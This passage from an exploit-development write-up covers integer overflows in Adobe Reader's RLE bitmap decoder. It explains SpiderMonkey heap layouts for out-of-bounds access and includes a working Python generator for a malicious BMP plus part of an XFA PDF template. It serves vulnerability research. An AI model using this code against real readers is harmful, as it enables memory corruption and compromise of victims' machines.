class="line">5</span><br></pre></td><td class="code"><pre><span class="line">high_4bits = BYTE1(cmd) &gt;&gt; <span class="number">4</span>;       <span class="comment">// high-order 4 bits</span></span><br><span class="line">low_4bits = BYTE1(cmd) &amp; <span class="number">0xF</span>;       <span class="comment">// low-order 4 bits</span></span><br><span class="line"><span class="comment">// 20CF45F8, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                   <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>Another one exists within the handling of uncompressed data:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF44EA, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                 <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><h2 id="0x05-Exploit"><a href="#0x05-Exploit" class="headerlink" title="0x05. Exploit"></a>0x05. Exploit</h2><h3 id="5-1-Overflow-Candidate"><a href="#5-1-Overflow-Candidate" class="headerlink" title="5.1 Overflow Candidate"></a>5.1 Overflow Candidate</h3><p>Three integer overflows were found within the function. Here we’ll choose the one within the handling of RLE8 data. It’s more exploit friendly than the others.</p><p>In terms of RLE4 data decoding, the value of <code>xpos</code> will be divided by <code>2</code> when putting data into the scan line. The maximum offset value for the scan line is <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> , it means that we can only <strong>write forward</strong> and the address we are trying to write is probably out of our control.</p><p>For RLE8 data decoding, the offset value for the scan line is <code>xpos</code> itself, thus we can <strong>write backward</strong> and the distance can be controlled. In the following <code>if</code> statement, the maximum value of <code>(unsigned __int8)cmd</code> is <code>0xFF</code> . And to bypass the check, the minimum value of <code>xpos</code> is <code>0xFFFFFF01</code> which should be <code>-255</code> in <code>signed int</code> form. In other words, we can write backward as large as <code>0xFF</code> bytes.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 20CF440F, this basic block was patched in the updated binary file</span></span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || (<span class="keyword">unsigned</span> __int8)cmd + xpos &gt; width )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;                       <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>However, the interval we’re trying to write can only be filled with the same value. This will cause some problems when writing exploit, it will be explained later.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">index = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  line = (_BYTE *)fn_get_scanline(v1[<span class="number">3</span>], ypos);</span><br><span class="line">  line[xpos++] = BYTE1(cmd);</span><br><span class="line">  ++index;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( index &lt; (<span class="keyword">unsigned</span> __int8)cmd );</span><br></pre></td></tr></table></figure><h3 id="5-2-SpiderMonkey-Concepts"><a href="#5-2-SpiderMonkey-Concepts" class="headerlink" title="5.2 SpiderMonkey Concepts"></a>5.2 SpiderMonkey Concepts</h3><p>Adobe Reader uses <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey" target="_blank" rel="noopener">SpiderMonkey</a> as its JavaScript engine. Before writing the exploit, let’s learn some essential knowledge of the SpiderMonkey engine.</p><h4 id="5-2-1-ArrayBuffer"><a href="#5-2-1-ArrayBuffer" class="headerlink" title="5.2.1 ArrayBuffer"></a>5.2.1 ArrayBuffer</h4><p>When the value of <code>byteLength</code> is greater than <code>0x68</code> , the backing store of the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer" target="_blank" rel="noopener">ArrayBuffer</a> object will be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it will be allocated from SpiderMonkey’s <strong>tenured heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">uint32_t</span> flags;               <span class="comment">// can be any value, default is 0</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;   <span class="comment">// byteLength</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;            <span class="comment">// pointer of associated view object</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;              <span class="comment">// can be any value, default is 0</span></span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>The names of the members in <code>ObjectElements</code> are meaningless for <code>ArrayBuffer</code> . Here the second member holds the <code>byteLength</code> value and the third member holds a pointer of the associated <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView</a> object. The values of the other members are meaningless and can be any digits.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x70</span>);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(ab);</span><br><span class="line">dv.setUint32(<span class="number">0</span>, <span class="number">0x41424344</span>, <span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the backing store of the <code>ArrayBuffer</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">34d54f80  00000000 00000070 2458f608 00000000</span><br><span class="line">;         data</span><br><span class="line">34d54f90  41424344 00000000 00000000 00000000</span><br><span class="line">34d54fa0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fb0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fc0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fd0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54fe0  00000000 00000000 00000000 00000000</span><br><span class="line">34d54ff0  00000000 00000000 00000000 00000000</span><br></pre></td></tr></table></figure><p>If we can change the value of the <code>byteLength</code> of <code>ArrayBuffer</code> , then we can achieve Out-Of-Bounds access. But be careful with the pointer of the associated <code>DataView</code> object, it can only be 0 or a valid <code>DataView</code> pointer, the process may crash immediately if we change it to some other values.</p><h4 id="5-2-2-Array"><a href="#5-2-2-Array" class="headerlink" title="5.2.2 Array"></a>5.2.2 Array</h4><p>When the value of <code>length</code> is greater than <code>14</code> , the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank" rel="noopener">Array</a> object can be allocated from system heap (through <code>ucrtbase!calloc</code>), otherwise it may be allocated from SpiderMonkey’s <strong>nursery heap</strong> . Also, when allocating from system heap, the underlying heap buffer will be <code>0x10</code> bytes larger to store the <code>ObjectElements</code> object.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectElements</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// The NumShiftedElementsBits high bits of this are used to store the</span></span><br><span class="line">  <span class="comment">// number of shifted elements, the other bits are available for the flags.</span></span><br><span class="line">  <span class="comment">// See Flags enum above.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * Number of initialized elements. This is &lt;= the capacity, and for arrays</span></span><br><span class="line"><span class="comment">   * is &lt;= the length. Memory for elements above the initialized length is</span></span><br><span class="line"><span class="comment">   * uninitialized, but values between the initialized length and the proper</span></span><br><span class="line"><span class="comment">   * length are conceptually holes.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> initializedLength;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of allocated slots. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> capacity;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 'length' property of array objects, unused for other objects. */</span></span><br><span class="line">  <span class="keyword">uint32_t</span> length;</span><br><span class="line"> <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">15</span>);</span><br><span class="line">array[<span class="number">0</span>] = array[array.length - <span class="number">1</span>] = <span class="number">0x41424344</span>;</span><br></pre></td></tr></table></figure><p>When executing the above JavaScript code in Adobe Reader, the underlying storage buffer of the <code>Array</code> object will be looked like this:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:010&gt; dd 34cb0f88-10 L90/4</span><br><span class="line">34cb0f78  00000000 0000000f 0000000f 0000000f</span><br><span class="line">34cb0f88  41424344 ffffff81 00000000 ffffff84 ; [0], [1]</span><br><span class="line">34cb0f98  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fa8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fb8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fc8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fd8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0fe8  00000000 ffffff84 00000000 ffffff84</span><br><span class="line">34cb0ff8  41424344 ffffff81 ???????? ???????? ; [14]</span><br></pre></td></tr></table></figure><p>The contents of both <code>array[0]</code> and <code>array[14]</code> are <code>41424344 ffffff81</code> , here the higher four bytes of data <code>0xFFFFFF81</code> indicates that the type of the element is <code>INT32</code> . And the contents of the elements within <code>[1, 13]</code> are all filled with <code>00000000 ffffff84</code> which means that they’re <code>undefined</code> .</p><p>If we can change the values of <code>capacity</code> and <code>length</code> , we can only achieve Out-Of-Bounds write, and the space after the original initialized elements and before the Out-Of-Bounds wrote elements will be filled with <code>00000000 ffffff84</code> . That’s some kind of meaningless.</p><p>It’s not a good idea to change <code>initializedLength</code> to a large value. This may lead to crash when scanning the array elements during GC. We’ll probably encounter inaccessible memory page and crash the process.</p><h4 id="5-2-3-JSObject"><a href="#5-2-3-JSObject" class="headerlink" title="5.2.3 JSObject"></a>5.2.3 JSObject</h4><p>In SpiderMonkey, almost all JavaScript objects are inherited from <code>JSObject</code> , and the later class is inherited from <code>ObjectImpl</code> .</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ObjectImpl</span> :</span> <span class="keyword">public</span> gc::Cell &#123;</span><br><span class="line">  <span class="keyword">protected</span>:</span><br><span class="line">    HeapPtrShape shape_;</span><br><span class="line">    HeapPtrTypeObject type_;</span><br><span class="line">    HeapSlot *slots;</span><br><span class="line">    HeapSlot *elements;</span><br><span class="line">  <span class="comment">// ......</span></span><br><span class="line">&#125;;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">JSObject</span> :</span> <span class="keyword">public</span> js::ObjectImpl &#123;&#125;</span><br></pre></td></tr></table></figure><p>For <code>DataView</code> object, the <code>elements</code> member will point to <code>emptyElementsHeader</code> which can be used to leak the base address of the JavaScript engine module.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> ObjectElements <span class="title">emptyElementsHeader</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Objects with no elements share one empty set of elements. */</span></span><br><span class="line">HeapSlot *js::emptyObjectElements =</span><br><span class="line">    <span class="keyword">reinterpret_cast</span>&lt;HeapSlot *&gt;(<span class="keyword">uintptr_t</span>(&amp;emptyElementsHeader) + </span><br><span class="line">    <span class="keyword">sizeof</span>(ObjectElements));</span><br></pre></td></tr></table></figure><h3 id="5-3-Bitmap-Construct"><a href="#5-3-Bitmap-Construct" class="headerlink" title="5.3 Bitmap Construct"></a>5.3 Bitmap Construct</h3><p>Following python code can be used to generate a RLE compressed bitmap image.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">RLE8 = <span class="number">1</span></span><br><span class="line">RLE4 = <span class="number">2</span></span><br><span class="line">COMPRESSION = RLE8</span><br><span class="line">BIT_COUNT = <span class="number">8</span></span><br><span class="line">CLR_USED = <span class="number">1</span> &lt;&lt; BIT_COUNT</span><br><span class="line">WIDTH = <span class="number">0xF0</span></span><br><span class="line">HEIGHT = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_file_header</span><span class="params">(file_size, bits_offset)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;2sIHHI'</span>, <span class="string">'BM'</span>, file_size, <span class="number">0</span>, <span class="number">0</span>, bits_offset)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_header</span><span class="params">(data_size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">'&lt;IIIHHIIIIII'</span>,</span><br><span class="line">        <span class="number">0x00000028</span>,</span><br><span class="line">        WIDTH,</span><br><span class="line">        HEIGHT,</span><br><span class="line">        <span class="number">0x0001</span>,</span><br><span class="line">        BIT_COUNT,</span><br><span class="line">        COMPRESSION,</span><br><span class="line">        data_size,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        <span class="number">0x00000000</span>,</span><br><span class="line">        CLR_USED,</span><br><span class="line">        <span class="number">0x00000000</span>)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_info_colors</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># B, G, R, Reserved</span></span><br><span class="line">    rgb_quad = <span class="string">'\x00\x00\xFF\x00'</span></span><br><span class="line">    <span class="keyword">return</span> rgb_quad * CLR_USED</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_bitmap_data</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># set ypos to 0 so that we'll be at the beginning of the heap buffer</span></span><br><span class="line">    <span class="comment"># ypos = (HEIGHT - 1) = 0, no need to bother</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF00</span></span><br><span class="line">    data = <span class="string">'\x00\x02\xFF\x00'</span> * (<span class="number">0xFFFFFF00</span> / <span class="number">0xFF</span>)</span><br><span class="line">    <span class="comment"># set xpos to 0xFFFFFF0C</span></span><br><span class="line">    data += <span class="string">'\x00\x02\x0C\x00'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0xFFFFFF0C + 0xF4 = 0</span></span><br><span class="line">    <span class="comment"># 0xF4 bytes of 0x10</span></span><br><span class="line">    data += <span class="string">'\xF4\x10'</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># mark end of bitmap to skip CxxThrowException</span></span><br><span class="line">    data += <span class="string">'\x00\x01'</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_bitmap</span><span class="params">(filepath)</span>:</span></span><br><span class="line">    data = get_bitmap_data()</span><br><span class="line">    data_size = len(data)</span><br><span class="line">    </span><br><span class="line">    bmi_header = get_bitmap_info_header(data_size)</span><br><span class="line">    bmi_colors = get_bitmap_info_colors()</span><br><span class="line">    </span><br><span class="line">    bmf_header_size = <span class="number">0x0E</span></span><br><span class="line">    bits_offset = bmf_header_size + len(bmi_header) + len(bmi_colors)</span><br><span class="line">    file_size = bits_offset + data_size</span><br><span class="line">    bmf_header = get_bitmap_file_header(file_size, bits_offset)</span><br><span class="line">    <span class="keyword">with</span> open(filepath, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bmf_header)</span><br><span class="line">        f.write(bmi_header)</span><br><span class="line">        f.write(bmi_colors)</span><br><span class="line">        f.write(data)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;output.bmp&gt;'</span> % os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_bitmap(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>Here we’ll generate a RLE8 bitmap with the following parameters:</p><ul><li>width is <code>0xF0</code> </li><li>height is <code>1</code> </li><li>bit count is <code>8</code> </li></ul><p>Here the size of the heap buffer will be <code>0xF0</code> and we will be able to write <code>0xF4</code> bytes backward with value <code>0x10</code> .</p><h3 id="5-4-PDF-Construct"><a href="#5-4-PDF-Construct" class="headerlink" title="5.4 PDF Construct"></a>5.4 PDF Construct</h3><p>This section explains how to embed the generated BMP image into a PDF file. Following is the PDF template that will be used later.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line">%PDF<span class="number">-1.7</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Catalog</span><br><span class="line">    /AcroForm <span class="number">5</span> <span class="number">0</span> R</span><br><span class="line">    /Pages <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /NeedsRendering <span class="literal">true</span></span><br><span class="line">    /Extensions</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /ADBE</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /ExtensionLevel <span class="number">3</span></span><br><span class="line">            /BaseVersion /<span class="number">1.7</span></span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Pages</span><br><span class="line">    /Kids [<span class="number">3</span> <span class="number">0</span> R]</span><br><span class="line">    /Count <span class="number">1</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Type /Page</span><br><span class="line">    /Parent <span class="number">2</span> <span class="number">0</span> R</span><br><span class="line">    /Contents <span class="number">4</span> <span class="number">0</span> R</span><br><span class="line">    /Resources</span><br><span class="line">    &lt;&lt;</span><br><span class="line">        /Font</span><br><span class="line">        &lt;&lt;</span><br><span class="line">            /F1</span><br><span class="line">            &lt;&lt;</span><br><span class="line">                /BaseFont /Helvetica</span><br><span class="line">                /Subtype /Type1</span><br><span class="line">                /Name /F1</span><br><span class="line">            &gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span 